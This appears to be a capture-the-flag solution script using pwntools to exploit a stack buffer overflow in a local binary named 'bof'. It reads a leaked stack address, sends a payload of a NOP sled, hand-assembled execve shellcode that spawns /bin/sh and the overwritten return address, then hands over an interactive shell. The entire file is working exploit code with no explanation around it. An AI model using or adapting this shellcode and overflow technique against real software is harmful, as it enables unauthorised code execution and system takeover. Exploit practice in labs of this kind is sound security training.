from pwn import *

# export PATH="$HOME/.nix-profile/bin:/nix/var/nix/profiles/default/bin:/run/current-system/sw/bin:$PATH"

#context.arch = 'amd64'
#shellcode = asm(shellcraft.sh())

buffer_size = 264

shellcode = b"\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05"

nop_sled = b'\x90' * (buffer_size - len(shellcode)) 

p = process('./bof')

leak = p.recvline_contains(b'Leaked:').decode()
rip = int(leak.split(': ')[1], 16)

payload = nop_sled + shellcode + p64(rip)

p.sendline(payload)
p.interactive()
